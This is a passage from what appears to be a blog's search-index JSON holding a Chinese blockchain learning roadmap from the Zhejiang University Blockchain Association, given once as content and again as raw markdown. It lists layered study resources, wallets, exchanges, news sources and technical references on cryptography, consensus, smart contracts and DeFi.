 ZK 入门 [🔗](https://zkhack.dev/whiteboard/module-one/) 还有个没什么公式代码的书[🔗](https://learn.z2o-k7e.world/zkp-intro/toc.html)\n-   **书籍**\n    -   《Mastering Bitcoin》，公认的区块链 1.0 的最好的书，涉及技术部分也较多 [🔗](https://berryjam.gitbook.io/mastering-bitcoin-3rd)\n    -   《Inevitable Ethereum》[🔗](https://inevitableeth.com/) 以太坊基本概念的科普\n    -   《区块链黑暗森林自救手册》[🔗](https://github.com/slowmist/Blockchain-dark-forest-selfguard-handbook) 慢雾出品，降低资产风险\n    -   《区块链红宝书--最接地气的币圈词典》[🔗](https://www.btc8686.com/wp-content/uploads/2022/02/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%BA%A2%E5%AE%9D%E4%B9%A6%E6%96%B0.pdf) 《Web3 黑话汇总》[🔗](https://github.com/WTFAcademy/WTF-gm) 一些常用的缩写\n-   **常用数字货币钱包**\n    -   MetaMusk：EVM 最常用钱包 [🔗](https://metamask.io/)\n    -   OKX：支持公链最多，用户体验极好 [🔗](https://www.okx.com/zh-hans/web3)\n    -   Unisat：BTC 常用钱包 [🔗](https://unisat.io/)\n    -   Phantom：SOL 常用钱包 [🔗](https://phantom.app/)\n    -   Trust Wallet [🔗](https://www.trustwallet.com/)\n    -   其他 [🔗](https://www.coincarp.com/zh/wallets/)\n-   **常用数字货币行情软件**\n    -   CoinGecko [🔗](https://www.coingecko.com/)\n    -   CoinMarkCap [🔗](https://coinmarketcap.com)\n-   **主流交易所**\n    -   CEX\n        -   币安 [🔗](https://www.binance.com/zh-CN)\n        -   OKX [🔗](https://www.okx.com)\n        -   其他 [🔗](https://www.coincarp.com/zh/exchanges/)\n    -   DEX\n        -   EVM DEX：Uniswap [🔗](https://uniswap.org/)\n        -   SOL DEX：Raydium [🔗](https://raydium.io/) Jupiter [🔗](https://jup.ag/)\n        -   PancakeSwap，支持多链 [🔗](https://pancakeswap.finance/)\n        -   其他 [🔗](https://www.coincarp.com/zh/exchanges/dex/)\n    -   NFT 市场\n        -   ETH 市场：Opensea [🔗](https://opensea.io/) Blur [🔗](https://blur.io)\n        -   MagicEden：多链，包括 BTC NFT 和符文 [🔗](https://magiceden.io/)\n        -   OKX Web3 Marketplace：多链，包括 BTC NFT、铭文、符文和 Atom [🔗](https://www.okx.com/zh-hans/web3/marketplace/nft)\n        -   铭文、符文、Atom、RGB 市场\n            -   OKX：最主流使用的 Web3 市场 [🔗](https://www.okx.com/zh-hans/web3/marketplace/nft)\n            -   Unisat Market [🔗](https://unisat.io/market)\n            -   RGB 市场仍在发展：HueHub [🔗](https://huehub.xyz/) Nomadland [🔗](https://market.nomadland.io/#/trade/info?id=0)\n-   **社交媒体资讯**\n    -   X (Twitter)\n        -   吴说 [🔗](https://twitter.com/WuBlockchain)\n        -   Twitter 加密货币消息聚合平台 [🔗](https://www.coinfeeds.io/news)\n    -   网站\n        -   cointelegraph [🔗](https://cointelegraph.com/)\n        -   the block [🔗](https://www.theblock.co/)\n        -   web3Caff [🔗](https://web3caff.com/zh/)\n        -   Medium [🔗](https://medium.com/)\n        -   登链社区 [🔗](https://learnblockchain.cn/)\n        -   比特币生态资源导航 [🔗](https://123btc.org/)\n    -   Newsletter\n        -   coinbase 每周咨询 [🔗](https://www.coinbase.com/bytes)\n        -   TLDR Newsletter (5min 科技新闻) [🔗](https://tldr.tech/)\n    -   媒体：\n        -   Foresight News [🔗](https://foresightnews.pro/)\n        -   Odaily 星球日报 [🔗](https://www.odaily.news/)\n        -   BlockBeats [🔗](https://theblockbeats.info)\n        -   PANews [🔗](https://www.panewslab.com/)\n        -   TechFlow 深潮 [🔗](https://www.techflowpost.com/)\n-   **风险须知**\n    -   遵守国家法律法规！\n    -   dyor，都是可选项，不是必选项。\n\n## 第二层\n\n有了入门的基础后，其实接下去都是一些可选的专题，对其中感兴趣的专题可以进行了解与学习。\n\n-   **技术向**：\n\n    -   密码学：\n\n        -   文章：介绍了简单的 `secp256k1`签名算法、比特币交易签名、 `schnorr` 多签 [🔗](https://www.btcstudy.org/2022/06/13/part-2-bitcoin-p2tr-transaction-breakdown/)\n        -   [noble-secp256k1](https://github.com/paulmillr/noble-secp256k1)：`secp256k1` 签名和 `ECDH` 的最快 4KB JS 实现。极其简洁，但内容完整且经过算法优化，非常适合从底层了解签名算法。作者还专门写了一篇介绍椭圆曲线算法加速的文章 [🔗](https://paulmillr.com/posts/noble-secp256k1-fast-ecc/)\n        -   文章：介绍基于 `schnorr` 签名算法的 `musig` 多签名，可用于设计链下多签名。[🔗](https://blog.blockstream.com/en-musig-a-new-multisignature-standard/) 这里还有一个 typescript 的实现 [🔗](https://github.com/wangshouh/musig)\n\n    -   共识算法：\n\n        -   PoW 相关：[🔗](https://github.com/indutny/proof-of-work)\n        -   PoS：[🔗](https://github.com/ethereum/consensus-specs)\n        -   PBFT：[🔗](https://pmg.csail.mit.edu/papers/osdi99.pdf)\n        -   dpos+pbft 算法分析：[🔗](https://github.com/sqfasd/dpos-pbft)\n        -   PoH：[🔗](https://docs.solanalabs.com/implemented-proposals/tower-bft#vote-tower)\n        -   DAG：\n            -   IOTA：[🔗](https://docs.iota.org/introduction)\n            -   Byteball：[🔗](https://byteball.org/)\n\n    -   智能合约：\n\n        -   智能合约开发是区块链应用的基础，不同区块链平台的智能合约可能不太一样，但是大多数都是借鉴了以太坊的智能合约，对于公有链领域，搞懂以太坊及其智能合约是首要的。和前面一样，可以去阅读以太坊的官方文档，也可以看一些书。\n        -   以太坊官方文档：[🔗](https://ethereum.org/en/developers/docs/)\n        -   Solidity 最新文档（可以切换版本查看其他版本的文档）：[🔗](https://docs.soliditylang.org/en/latest/)\n        -   书籍：《精通以太坊》[🔗](https://github.com/ethereumbook/ethereumbook)，主要就是介绍以太坊，以及如何在以太坊上写智能合约，以太坊 CTO 著，好书，至今依然在更新\n        -   除了以太坊以外，还可以了解波卡、Polygon 和 Dfinity 等公有区块链。对于联盟链的智能合约，如 Hyperledger Fabric，可以自行找一些书或者文档看。\n        -   以太坊 Dapp 开发学习路线：[🔗](eth/eth_dapp.md)\n        -   SOL 开发教程，非常详细 [🔗](https://www.soldev.app/course)\n\n    -   虚拟机：\n\n        -   evm\n            -   evm-awesome-list：[🔗](https://ethereum.org/en/developers/docs/evm/)，以太坊开发者官方文档\n            -   evm 解析：[🔗](https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md)，这是了解 EVM、它与 Solidity 的关系以及如何使用一些调试工具的指南。\n            -   文章：使用 yul 汇编深入理解 solidity 和 evm 的底层技术 [🔗](https://mirror.xyz/0xB38709B8198d147cc9Ff9C133838a044d78B064B/nk40v2MJKSHXXNSlbqqhpwJf4MtZ9V2Vp8P_bSNwjYc), 小白科普向，一共有三篇\n            -   [EVM Codes](https://www.evm.codes/)：探索 evm 和 solidity 底层必备工具，可以快速查找 Opcodes 操作码和 Precompiled 预编译函数的具体功能、用法和 gas 情况。另一个有用的工具是 [forge debugger](https://book.getfoundry.sh/forge/debugger)\n        -   wasm（WebAssembly）\n            -   eth-ewasm：[🔗](https://github.com/ewasm)\n\n    -   去中心化存储\n        -   IPFS/Filecoin：[🔗](https://github.com/Blockchain-zju/blockchainer-roadmap/tree/master/ipfs)\n    -   跨链：\n\n        -   跨链是目前区块链最前沿的技术，也是未来发展的重要方向之一\n        -   论文：V 神总结的区块链互操作性文章：Buterin V. Chain interoperabilit [🔗](https://www.r3.com/wp-content/uploads/2017/06/chain_interoperability_r3.pdf)\n        -   一些不错的博客文章：\n            -   关于跨链技术的分析与思考：[🔗](https://mp.weixin.qq.com/s/fgRPwzVPB3Si5aHSCACvAg)\n            -   跨链通信简要研究：[🔗](https://mp.weixin.qq.com/s/X7ztDBG6kqgrBaGwrrsfQw)\n        -   论文：Polkadot 最新的论文：Overview of Polkadot and its Design Considerations[🔗](https://eprint.iacr.org/2020/641.pdf)\n        -   国际最领先的跨链平台 Polkadot 源码（rust）：[🔗](https://github.com/paritytech/polkadot)\n        -   国内最领先的跨链平台 BitXHub 源码（go）：[🔗](https://github.com/meshplus/bitxhub)\n        -   有兴趣有精力的还可以了解下 Subtrate：[🔗](https://substrate.dev)\n\n    -   DeFi\n        -   安全\n            -   文章：16个 solidity合约漏洞，修复和真实世界的案例 [🔗](https://hackernoon.com/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148)\n            -   工具：\n                -   [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs)：收录了很多资安事件的概念性验证程序\n                -   [DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs)：整理了常见Solidity的漏洞测试与防御方式\n        -   实现\n    -   MEV\n    -   **联盟链**：\n\n        -   **联盟链学习 roadmap - 第一层**：[🔗](consortium/consortium.md)\n        -   联盟链领域只要搞懂了 Hyperledger Fabric、R3 Corda 这两个项目的东西基本上就搞懂了 80%的内容；学习方式可以是直接阅读这些项目上的文档、其他人写的博客、或者看书。\n        -   Hyperledger Fabric 官方文档：[🔗](https://hyperledger-fabric.readthedocs.io/en/latest/)\n        -   书籍《区块链技术进阶实战》（豆瓣介绍[🔗](https://book.douban.com/subject/30177480/)，介绍了 Hyperledger Fabric、以太坊、Hyperchain）\n        -   书籍《区块链原理、设计与应用》（豆瓣介绍[🔗](https://book.douban.com/subject/27127839/)，全书都是在讲 Hyperledger Fabric，有源码分析）\n\n    -   具体链相关资源\n        -   ETH\n            -   eth roadmap - 第一层：[🔗](eth/eth.md)\n\n-   **商业向**：\n    -   research/dataAnalysis：\n        -   文章：从新闻聚合器到链上分析工具，十大加密研究工具清单 [🔗](https://abmedia.io/20220726-the-10-must-have-crypto-research-tools)\n        -   [🥩 RAW](https://github.com/chainfeeds/RSSAggregatorforWeb3)：一个聚合了500多个关于Web3的RSS的仓库，里面讲技术的略少，大量文章关于项目动态\n    -   ICO：\n        -   搜索并了解 ERC-20\n        -   搜索并了解 ICO\n        -   各国对 ICO 的监管态度\n    -   爆款区块链应用：\n        -   搜索并了解加密猫、像素大师\n    -   Token：\n        -   搜索并了解什么是代币经济学\n    -   Staking：\n        -   搜索并了解什么是 Staking Economy\n    -   **DeFi**：Decentralized Finance\n        -   搜索并了解什么是 DeFi\n        -   书籍推荐：《How to DeFi》：[🔗](https://github.com/Blockchain-zju/HistoryFiles/blob/main/defi/How_to_DeFi_CHN.pdf)\n    -   **NFT**：Non-fungible Token\n        -   **Roadmap-NFT 第一层**：[🔗](nft/nft.md)\n        -   文章：了解 5 种流行的 NFT 投放方式及其优缺点 [🔗](https://web3caff.com/zh/archives/23106)\n\n## 第三层\n\n> 越了解，越广阔\n\n-   **技术向**：\n\n    -   阅读经典论文/文章：\n        -   bitcoin 白皮书：Bitcoin: A Peer-to-Peer Electronic Cash System[🔗](https://bitcoin.org/bitcoin.pdf)\n        -   以太坊白皮书：Ethereum: A next-generation smart contract and decentralized application platform[🔗](https://github.com/ethereum/wiki/wiki/White-Paper)\n            -   如果有能力也应该看下以太坊黄皮书：Ethereum: A secure decentralised generalised transaction ledger[🔗](https://ethereum.github.io/yellowpaper/paper.pdf)\n            -   以太坊的 wiki：[🔗](https://github.com/ethereum/wiki/wiki)\n            -   go-ethereum-code-analysis：[🔗](https://github.com/ZtesoftCS/go-ethereum-code-analysis)\n            -   以太坊源码分析-teaspring 的技术专栏：[🔗](https://blog.csdn.net/teaspring)\n            -   干货|以太坊分片:overview and finalit：[🔗](https://ethfans.org/posts/ethereum-sharding-and-finality)\n        -   EOS 白皮书：[🔗](https://github.com/EOSIO/Documentation/blob/master/TechnicalWhitePaper.md)\n        -   Polkadot 白皮书：Polkadot: Vision for a heterogeneous multi-chain framework\n        -   **这 33 篇区块链必读论文 , 读过 5 篇以上的竟不到 1%**：[🔗](https://www.chainnews.com/articles/363251574672.htm)\n        -   建议可以按照自己感兴趣的主题去**Google Scholar**里搜索，如：blockchain, distribute ledger 等。\n    -   阅读经典项目源码：\n\n        -   Bitcoin 源码：[🔗](https://github.com/bitcoin/bitcoin)\n        -   Ethereum 源码(go-ethereum)：[🔗](https://github.com/ethereum/go-ethereum)\n        -   EOS 源码：[🔗](https://github.com/EOSIO/eos)\n        -   Hyperledger Fabric 源码：[🔗](https://github.com/hyperledger/fabric)\n\n    -   ETH2.0：\n        -   了解 ETH1.0 的扩容方案\n        -   了解 ETH2.0 的 Roadmap 路线图\n        -   了解 layer2 和分片的区别\n        -   了解 layer2 最新进展 rollup 的两大方向 optimistic-rollup 和 zk-rollup 的区别\n    -   **联盟链**：\n        -   **联盟链学习 roadmap - 第二层**：[🔗](consortium/consortium.md)\n\n-   **商业向**（可以在公有链和联盟链中选一个，有精力的话建议全部都搞）：\n    -   公有链方向，深入了解 DeFi 和 NFT：\n        -   **DeFi**\n            -   深入体验多款 DeFi 产品\n            -   了解 DeFi 的生态，阅读一些 DeFi 的研究报告 [🔗](https://github.com/Blockchain-zju/HistoryFiles/blob/main/defi/defi_report.pdf)\n        -   **NFT**\n            -   深入体验多款 NFT 产品\n            -   **Roadmap-NFT 第二层**：[🔗](nft/nft.md)\n    -   联盟链方向，深入了解各个联盟链框架以及联盟链的商业价值和应用实践：\n        -   **联盟链学习 roadmap - 第三层**：[🔗](consortium/consortium.md)\n        -   存证、溯源、供应链金融、数字身份、政务、版权保护....\n        -   建议先看《2018 年中国区块链产业白皮书》，虽然目前已经是 2020 年了，但是这个报告确实不错\n        -   有一些书籍：《产业区块链》（豆瓣介绍[🔗](https://book.douban.com/subject/35030217/)，腾讯系的区块链实践，马化腾作序，可以起到一些了解的作用）\n\n## 第一百层\n\n> 浩瀚无垠，分头突围\n\n## 其他优质资源\n\n-   awesome-blockchain：[🔗](https://github.com/chaozh/awesome-blockchain-cn)\n-   awesome-metaverse：[🔗](https://github.com/M3-org/awesome-metaverse)\n-   awesome-zjubca：[🔗](https://github.com/Blockchain-zju/awesome-zjubca)\n-   Journey-to-become-a-Blockchain-Engineer: [🔗](https://github.com/spo0ds/Journey-to-become-a-Blockchain-Engineer)\n\n多用 Google，多逛国外论坛，多水群，时刻关注区块链前沿。\n\n## 大气层\n\n从狭义区块链的视角转向广义区块链的视角：Web3。\n\n> 区块链是手段，Web3 是目的。\n\n-   Web3-WIKI：[🔗](https://github.com/Web3-Club/Web3wiki-Website)\n\n## 太空宇宙\n\n> Metaverse：下一代互联网/数字世界的形态。\n\n-   Metaverse-WIKI：[🔗](https://en.wikipedia.org/wiki/Metaverse)\n","source":"_posts/BlockChain/Road/01-区块链基本路线.md","raw":"---\ntitle: 01-区块链基本路线\ndate: 2024-08-02 00:00:46\ntags:\n  - BlockChain\n  - Road\ncategories:\n  - BlockChain\n  - Road\n---\n# blockchainer-roadmap 2024\n\n区块链者学习路线 2024🚀🚀🚀🚀\n\n—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）\n\n在总结过往学习资料、路线的基础上，结合最新的区块链前沿技术，制定了本学习路线 🎨。\n\n## 第一层\n\n区块链入门\n\n-   **纪录片**\n    -   《区块链之新》6 集，小小名人录 [🔗](https://www.bilibili.com/bangumi/play/ep290332?from=search&seid=4820733908948631673)\n-   **网课**\n    -   区块链技术与应用，北大肖臻老师出品，内容极佳 [🔗](https://www.bilibili.com/video/av37065233) 笔记 [🔗](https://github.com/CSWellesSun/CSNotes/blob/main/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/Note/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8.md)\n    -   WTF Academy，开发者的 Web3 开源大学 [🔗](https://www.wtf.academy/)\n    -   DeFi 去中心化金融，UCB 课程 [🔗](https://www.bilibili.com/video/BV1iV4y1T7iL/)\n    -   DAPP 开发入门，新手友好 [🔗](https://guoyu.mirror.xyz/RD-xkpoxasAU7x5MIJmiCX4gll3Cs0pAd5iM258S1Ek)\n    -   Crypto Zombie，通过完成一个小游戏来学习 DAPP 开发 [🔗](https://cryptozombies.io/)\n    -   Solidity 入门，以太坊开发 [🔗](https://blog.chain.link/learn-blockchain-full-stack-web3-javascript-smart-contract-development-zh/)\n    -   ZK 入门 [🔗](https://zkhack.dev/whiteboard/module-one/) 还有个没什么公式代码的书[🔗](https://learn.z2o-k7e.world/zkp-intro/toc.html)\n-   **书籍**\n    -   《Mastering Bitcoin》，公认的区块链 1.0 的最好的书，涉及技术部分也较多 [🔗](https://berryjam.gitbook.io/mastering-bitcoin-3rd)\n    -   《Inevitable Ethereum》[🔗](https://inevitableeth.com/) 以太坊基本概念的科普\n    -   《区块链黑暗森林自救手册》[🔗](https://github.com/slowmist/Blockchain-dark-forest-selfguard-handbook) 慢雾出品，降低资产风险\n    -   《区块链红宝书--最接地气的币圈词典》[🔗](https://www.btc8686.com/wp-content/uploads/2022/02/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%BA%A2%E5%AE%9D%E4%B9%A6%E6%96%B0.pdf) 《Web3 黑话汇总》[🔗](https://github.com/WTFAcademy/WTF-gm) 一些常用的缩写\n-   **常用数字货币钱包**\n    -   MetaMusk：EVM 最常用钱包 [🔗](https://metamask.io/)\n    -   OKX：支持公链最多，用户体验极好 [🔗](https://www.okx.com/zh-hans/web3)\n    -   Unisat：BTC 常用钱包 [🔗](https://unisat.io/)\n    -   Phantom：SOL 常用钱包 [🔗](https://phantom.app/)\n    -   Trust Wallet [🔗](https://www.trustwallet.com/)\n    -   其他 [🔗](https://www.coincarp.com/zh/wallets/)\n-   **常用数字货币行情软件**\n    -   CoinGecko [🔗](https://www.coingecko.com/)\n    -   CoinMarkCap [🔗](https://coinmarketcap.com)\n-   **主流交易所**\n    -   CEX\n        -   币安 [🔗](https://www.binance.com/zh-CN)\n        -   OKX [🔗](https://www.okx.com)\n        -   其他 [🔗](https://www.coincarp.com/zh/exchanges/)\n    -   DEX\n        -   EVM DEX：Uniswap [🔗](https://uniswap.org/)\n        -   SOL DEX：Raydium [🔗](https://raydium.io/) Jupiter [🔗](https://jup.ag/)\n        -   PancakeSwap，支持多链 [🔗](https://pancakeswap.finance/)\n        -   其他 [🔗](https://www.coincarp.com/zh/exchanges/dex/)\n    -   NFT 市场\n        -   ETH 市场：Opensea [🔗](https://opensea.io/) Blur [🔗](https://blur.io)\n        -   MagicEden：多链，包括 BTC NFT 和符文 [🔗](https://magiceden.io/)\n        -   OKX Web3 Marketplace：多链，包括 BTC NFT、铭文、符文和 Atom [🔗](https://www.okx.com/zh-hans/web3/marketplace/nft)\n        -   铭文、符文、Atom、RGB 市场\n            -   OKX：最主流使用的 Web3 市场 [🔗](https://www.okx.com/zh-hans/web3/marketplace/nft)\n            -   Unisat Market [🔗](https://unisat.io/market)\n            -   RGB 市场仍在发展：HueHub [🔗](https://huehub.xyz/) Nomadland [🔗](https://market.nomadland.io/#/trade/info?id=0)\n-   **社交媒体资讯**\n    -   X (Twitter)\n        -   吴说 [🔗](https://twitter.com/WuBlockchain)\n        -   Twitter 加密货币消息聚合平台 [🔗](https://www.coinfeeds.io/news)\n    -   网站\n        -   cointelegraph [🔗](https://cointelegraph.com/)\n        -   the block [🔗](https://www.theblock.co/)\n        -   web3Caff [🔗](https://web3caff.com/zh/)\n        -   Medium [🔗](https://medium.com/)\n        -   登链社区 [🔗](https://learnblockchain.cn/)\n        -   比特币生态资源导航 [🔗](https://123btc.org/)\n    -   Newsletter\n        -   coinbase 每周咨询 [🔗](https://www.coinbase.com/bytes)\n        -   TLDR Newsletter (5min 科技新闻) [🔗](https://tldr.tech/)\n    -   媒体：\n        -   Foresight News [🔗](https://foresightnews.pro/)\n        -   Odaily 星球日报 [🔗](https://www.odaily.news/)\n        -   BlockBeats [🔗](https://theblockbeats.info)\n        -   PANews [🔗](https://www.panewslab.com/)\n        -   TechFlow 深潮 [🔗](https://www.techflowpost.com/)\n-   **风险须知**\n    -   遵守国家法律法规！\n    -   dyor，都是可选项，不是必选项。\n\n## 第二层\n\n有了入门的基础后，其实接下去都是一些可选的专题，对其中感兴趣的专题可以进行了解与学习。\n\n-   **技术向**：\n\n    -   密码学：\n\n        -   文章：介绍了简单的 `secp256k1`签名算法、比特币交易签名、 `schnorr` 多签 [🔗](https://www.btcstudy.org/2022/06/13/part-2-bitcoin-p2tr-transaction-breakdown/)\n        -   [noble-secp256k1](https://github.com/paulmillr/noble-secp256k1)：`secp256k1` 签名和 `ECDH` 的最快 4KB JS 实现。极其简洁，但内容完整且经过算法优化，非常适合从底层了解签名算法。作者还专门写了一篇介绍椭圆曲线算法加速的文章 [🔗](https://paulmillr.com/posts/noble-secp256k1-fast-ecc/)\n        -   文章：介绍基于 `schnorr` 签名算法的 `musig` 多签名，可用于设计链下多签名。[🔗](https://blog.blockstream.com/en-musig-a-new-multisignature-standard/) 这里还有一个 typescript 的实现 [🔗](https://github.com/wangshouh/musig)\n\n    -   共识算法：\n\n        -   PoW 相关：[🔗](https://github.com/indutny/proof-of-work)\n        -   PoS：[🔗](https://github.com/ethereum/consensus-specs)\n        -   PBFT：[🔗](https://pmg.csail.mit.edu/papers/osdi99.pdf)\n        -   dpos+pbft 算法分析：[🔗](https://github.com/sqfasd/dpos-pbft)\n        -   PoH：[🔗](https://docs.solanalabs.com/implemented-proposals/tower-bft#vote-tower)\n        -   DAG：\n            -   IOTA：[🔗](https://docs.iota.org/introduction)\n            -   Byteball：[🔗](https://byteball.org/)\n\n    -   智能合约：\n\n        -   智能合约开发是区块链应用的基础，不同区块链平台的智能合约可能不太一样，但是大多数都是借鉴了以太坊的智能合约，对于公有链领域，搞懂以太坊及其智能合约是首要的。和前面一样，可以去阅读以太坊的官方文档，也可以看一些书。\n        -   以太坊官方文档：[🔗](https://ethereum.org/en/developers/docs/)\n        -   Solidity 最新文档（可以切换版本查看其他版本的文档）：[🔗](https://docs.soliditylang.org/en/latest/)\n        -   书籍：《精通以太坊》[🔗](https://github.com/ethereumbook/ethereumbook)，主要就是介绍以太坊，以及如何在以太坊上写智能合约，以太坊 CTO 著，好书，至今依然在更新\n        -   除了以太坊以外，还可以了解波卡、Polygon 和 Dfinity 等公有区块链。对于联盟链的智能合约，如 Hyperledger Fabric，可以自行找一些书或者文档看。\n        -   以太坊 Dapp 开发学习路线：[🔗](eth/eth_dapp.md)\n        -   SOL 开发教程，非常详细 [🔗](https://www.soldev.app/course)\n\n    -   虚拟机：\n\n        -   evm\n            -   evm-awesome-list：[🔗](https://ethereum.org/en/developers/docs/evm/)，以太坊开发者官方文档\n            -   evm 解析：[🔗](https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md)，这是了解 EVM、它与 Solidity 的关系以及如何使用一些调试工具的指南。\n            -   文章：使用 yul 汇编深入理解 solidity 和 evm 的底层技术 [🔗](https://mirror.xyz/0xB38709B8198d147cc9Ff9C133838a044d78B064B/nk40v2MJKSHXXNSlbqqhpwJf4MtZ9V2Vp8P_bSNwjYc), 小白科普向，一共有三篇\n            -   [EVM Codes](https://www.evm.codes/)：探索 evm 和 solidity 底层必备工具，可以快速查找 Opcodes 操作码和 Precompiled 预编译函数的具体功能、用法和 gas 情况。另一个有用的工具是 [forge debugger](https://book.getfoundry.sh/forge/debugger)\n        -   wasm（WebAssembly）\n            -   eth-ewasm：[🔗](https://github.com/ewasm)\n\n    -   去中心化存储\n        -   IPFS/Filecoin：[🔗](https://github.com/Blockchain-zju/blockchainer-roadmap/tree/master/ipfs)\n    -   跨链：\n\n        -   跨链是目前区块链最前沿的技术，也是未来发展的重要方向之一\n        -   论文：V 神总结的区块链互操作性文章：Buterin V. Chain interoperabilit [🔗](https://www.r3.com/wp-content/uploads/2017/06/chain_interoperability_r3.pdf)\n        -   一些不错的博客文章：\n            -   关于跨链技术的分析与思考：[🔗](https://mp.weixin.qq.com/s/fgRPwzVPB3Si5aHSCACvAg)\n            -   跨链通信简要研究：[🔗](https://mp.weixin.qq.com/s/X7ztDBG6kqgrBaGwrrsfQw)\n        -   论文：Polkadot 最新的论文：Overview of Polkadot and its Design Considerations[🔗](https://eprint.iacr.org/2020/641.pdf)\n        -   国际最领先的跨链平台 Polkadot 源码（rust）：[🔗](https://github.com/paritytech/polkadot)\n        -   国内最领先的跨链平台 BitXHub 源码（go）：[🔗](https://github.com/meshplus/bitxhub)\n        -   有兴趣有精力的还可以了解下 Subtrate：[🔗](https://substrate.dev)\n\n    -   DeFi\n        -   安全\n            -   文章：16个 solidity合约漏洞，修复和真实世界的案例 [🔗](https://hackernoon.com/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148)\n            -   工具：\n                -   [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs)：收录了很多资安事件的概念性验证程序\n                -   [DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs)：整理了常见Solidity的漏洞测试与防御方式\n        -   实现\n    -   MEV\n    -   **联盟链**：\n\n        -   **联盟链学习 roadmap - 第一层**：[🔗](consortium/consortium.md)\n        -   联盟链领域只要搞懂了 Hyperledger Fabric、R3 Corda 这两个项目的东西基本上就搞懂了 80%的内容；学习方式可以是直接阅读这些项目上的文档、其他人写的博客、或者看书。\n        -   Hyperledger Fabric 官方文档：[🔗](https://hyperledger-fabric.readthedocs.io/en/latest/)\n        -   书籍《区块链技术进阶实战》（豆瓣介绍[🔗](https://book.douban.com/subject/30177480/)，介绍了 Hyperledger Fabric、以太坊、Hyperchain）\n        -   书籍《区块链原理、设计与应用》（豆瓣介绍[🔗](https://book.douban.com/subject/27127839/)，全书都是在讲 Hyperledger Fabric，有源码分析）\n\n    -   具体链相关资源\n        -   ETH\n            -   eth roadmap - 第一层：[🔗](eth/eth.md)\n\n-   **商业向**：\n    -   research/dataAnalysis：\n        -   文章：从新闻聚合器到链上分析工具，十大加密研究工具清单 [🔗](https://abmedia.io/20220726-the-10-must-have-crypto-research-tools)\n        -   [🥩 RAW](https://github.com/chainfeeds/RSSAggregatorforWeb3)：一个聚合了500多个关于Web3的RSS的仓库，里面讲技术的略少，大量文章关于项目动态\n    -   ICO：\n        -   搜索并了解 ERC-20\n        -   搜索并了解 ICO\n        -   各国对 ICO 的监管态度\n    -   爆款区块链应用：\n        -   搜索并了解加密猫、像素大师\n    -   Token：\n        -   搜索并了解什么是代币经济学\n    -   Staking：\n        -   搜索并了解什么是 Staking Economy\n    -   **DeFi**：Decentralized Finance\n        -   搜索并了解什么是 DeFi\n        -   书籍推荐：《How to DeFi》：[🔗](https://github.com/Blockchain-zju/HistoryFiles/blob/main/defi/How_to_DeFi_CHN.pdf)\n    -   **NFT**：Non-fungible Token\n        -   **Roadmap-NFT 第一层**：[🔗](nft/nft.md)\n        -   文章：了解 5 种流行的 NFT 投放方式及其优缺点 [🔗](https://web3caff.com/zh/archives/23106)\n\n## 第三层\n\n> 越了解，越广阔\n\n-   **技术向**：\n\n    -   阅读经典论文/文章：\n        -   bitcoin 白皮书：Bitcoin: A Peer-to-Peer Electronic Cash System[🔗](https://bitcoin.org/bitcoin.pdf)\n        -   以太坊白皮书：Ethereum: A next-generation smart contract and decentralized application platform[🔗](https://github.com/ethereum/wiki/wiki/White-Paper)\n            -   如果有能力也应该看下以太坊黄皮书：Ethereum: A secure decentralised generalised transaction ledger[🔗](https://ethereum.github.io/yellowpaper/paper.pdf)\n            -   以太坊的 wiki：[🔗](https://github.com/ethereum/wiki/wiki)\n            -   go-ethereum-code-analysis：[🔗](https://github.com/ZtesoftCS/go-ethereum-code-analysis)\n            -   以太坊源码分析-teaspring 的技术专栏：[🔗](https://blog.csdn.net/teaspring)\n            -   干货|以太坊分片:overview and finalit：[🔗](https://ethfans.org/posts/ethereum-sharding-and-finality)\n        -   EOS 白皮书：[🔗](https://github.com/EOSIO/Documentation/blob/master/TechnicalWhitePaper.md)\n        -   Polkadot 白皮书：Polkadot: Vision for a heterogeneous multi-chain framework\n        -   **这 33 篇区块链必读论文 , 读过 5 篇以上的竟不到 1%**：[🔗](https://www.chainnews.com/articles/363251574672.htm)\n        -   建议可以按照自己感兴趣的主题去**Google Scholar**里搜索，如：blockchain, distribute ledger 等。\n    -   阅读经典项目源码：\n\n        -   Bitcoin 源码：[🔗](https://github.com/bitcoin/bitcoin)\n        -   Ethereum 源码(go-ethereum)：[🔗](https://github.com/ethereum/go-ethereum)\n        -   EOS 源码：[🔗](https://github.com/EOSIO/eos)\n        -   Hyperledger Fabric 源码：[🔗](https://github.com/hyperledger/fabric)\n\n    -   ETH2.0：\n        -   了解 ETH1.0 的扩容方案\n        -   了解 ETH2.0 的 Roadmap 路线图\n        -   了解 layer2 和分片的区别\n        -   了解 layer2 最新进展 rollup 的两大方向 optimistic-rollup 和 zk-rollup 的区别\n    -   **联盟链**：\n        -   **联盟链学习 roadmap - 第二层**：[🔗](consortium/consortium.md)\n\n-   **商业向**（可以在公有链和联盟链中选一个，有精力的话建议全部都搞）：\n    -   公有链方向，深入了解 DeFi 和 NFT：\n        -   **DeFi**\n            -   深入体验多款 DeFi 产品\n            -   了解 DeFi 的生态，阅读一些 DeFi 的研究报告 [🔗](https://github.com/Blockchain-zju/HistoryFiles/blob/main/defi/defi_report.pdf)\n        -   **NFT**\n            -   深入体验多款 NFT 产品\n            -   **Roadmap-NFT 第二层**：[🔗](nft/nft.md)\n    -   联盟链方向，深入了解各个联盟链框架以及联盟链的商业价值和应用实践：\n        -   **联盟链学习 roadmap - 第三层**：[🔗](consortium/consortium.md)\n        -   存证、溯源、供应链金融、数字身份、政务、版权保护....\n        -   建议先看《2018 年中国区块链产业白皮书》，虽然目前已经是 2020 年了，但是这个报告确实不错\n        -   